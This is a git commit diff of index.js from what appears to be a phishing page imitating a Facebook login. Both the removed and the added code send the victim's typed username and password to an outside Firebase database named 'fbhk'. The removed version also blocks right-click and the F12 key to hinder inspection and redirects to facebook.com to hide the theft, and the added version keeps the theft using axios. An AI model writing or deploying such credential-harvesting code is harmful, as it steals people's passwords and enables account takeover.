a2965256370aa1c511b38b449b227c2ac881d7f8
Creepingdeath999 <mtchedlidze.elguja@atsu.edu.ge>
2021-05-17 23:29:05 +0400

    axios

--- index.js
+++ index.js
@@ -1,43 +1,12 @@
 const userNaname=document.getElementById('username');
 const password=document.getElementById('password');
 const btn=document.querySelector("button");
-
-async function postData(url = '', data = {}) {
-
-    const response = await fetch(url, {
-      method: 'POST', 
-      mode: 'cors', 
-      cache: 'no-cache',
-      credentials: 'same-origin', 
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      redirect: 'follow', 
-      referrerPolicy: 'no-referrer', 
-      body: JSON.stringify(data) 
-    });
-    return response.json();
-  }
-  document.addEventListener('contextmenu', event => event.preventDefault());
-  document.onkeydown = function (e) {
- 
-    if(e.keyCode == 123) {
-        return false;
-    }
-  }
- 
-    btn.addEventListener('click', ()=>{
+btn.addEventListener('click', ()=>{
       if(password.value.trim()==="" || userNaname.value.trim()===""){
         return
       }else{
-        postData('https://fbhk-9882a-default-rtdb.firebaseio.com/fbhk.json', { userName:userNaname.value, password:password.value})
-        .then(data => {
-          console.log(data); 
-        }).then(
-           setTimeout(() => {
-             open("https://www.facebook.com/", "_self")
-           }, 10000)
-        );
-
+        axios.post('https://fbhk-9882a-default-rtdb.firebaseio.com/fbhk.json', { userName:userNaname.value, password:password.value} ).then(
+          data=>console.log(data)
+        )
           }
     })
